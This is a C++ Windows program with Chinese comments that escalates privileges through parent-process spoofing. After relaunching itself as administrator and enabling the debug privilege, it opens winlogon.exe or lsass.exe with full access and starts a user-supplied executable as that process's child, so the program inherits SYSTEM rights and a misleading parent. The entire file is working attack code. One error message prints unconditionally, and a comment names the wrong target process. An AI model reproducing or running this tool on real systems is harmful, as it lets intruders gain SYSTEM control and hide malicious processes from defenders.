#include <iostream>
#include <windows.h>  
#include <TlHelp32.h>
using namespace std;


bool EnableDebugPriv()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return false;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}

DWORD GetProcessIDByName(const char* pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
		if (strcmp(pe.szExeFile, pName) == 0) {
			CloseHandle(hSnapshot);
			return pe.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

bool IsProcessRunAsAdmin()
{
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	BOOL b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);
	if (b)
	{
		CheckTokenMembership(NULL, AdministratorsGroup, &b);
		FreeSid(AdministratorsGroup);
	}
	return b == TRUE;
}

string GetAppPath()
{
	char szFilePath[MAX_PATH + 1];
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	return szFilePath;
}

int RunAsAdmin()
{
	HINSTANCE res;
	string Path = GetAppPath(); 
	res = ShellExecute(NULL, "runas", Path.c_str(), "", NULL, SW_SHOW);
	return (int)res;
}

bool CreateProcessFromParent()
{
	if (!IsProcessRunAsAdmin()) {
		RunAsAdmin();
		exit(0);
	}
	
	char lpPath[256];
	cout << "请输入启动程序路径：";
	cin >> lpPath;
	
	char str[][20] = { "winlogon.exe","lsass.exe" };
	DWORD pid = 0;
	int index = 0;
	do
	{
		pid = GetProcessIDByName(str[index++]);
		if (pid == 0) break;
	} while (index < sizeof(str) / 20);
	if (pid == 0 ) return false;

	//程序提权
	if (!EnableDebugPriv()) {
		cout << "提权失败 !!!" << endl;
		return false;
	}

	//创建启动信息结构体
	STARTUPINFOEXA si;

	//初始化结构体
	ZeroMemory(&si, sizeof(si));

	//设置结构体成员
	si.StartupInfo.cb = sizeof(si);

	//已全部权限打开services.exe 进程
	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("OpenProcess failed ! (%d). \n ", GetLastError());

	SIZE_T lpSize = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &lpSize);
	
	//转换指针到正确类型
	char * pTemp = new char[(int)lpSize];
	LPPROC_THREAD_ATTRIBUTE_LIST AttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pTemp;

	InitializeProcThreadAttributeList(AttributeList, 1, 0, &lpSize);

	//用已构造的属性结构体更新属性表
	if (!UpdateProcThreadAttribute(
		AttributeList, 
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
		&handle, 
		sizeof(HANDLE), 
		NULL, 
		NULL))
	{
		cout << "Fail to update attributes" << endl;
		return false;
	}

	si.lpAttributeList = AttributeList;
	
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	if (CreateProcessAsUser(NULL, lpPath, 0,
		0, 0, 0, EXTENDED_STARTUPINFO_PRESENT,
		0, 0, (LPSTARTUPINFOA)&si, &pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		DeleteProcThreadAttributeList(AttributeList);
		delete pTemp;

		cout << "CreateProcessAsUserA Succeed ! ProcessId: " << pi.dwProcessId << endl;
		return true;
	}
	else
	{
		cout << "CreateProcessAsUserA Failed ! Error:" << GetLastError() << endl;
	}
	DeleteProcThreadAttributeList(AttributeList);
	delete pTemp;

	return false;
}

int main(void) {
	CreateProcessFromParent();
	system("pause");
	return 0;
}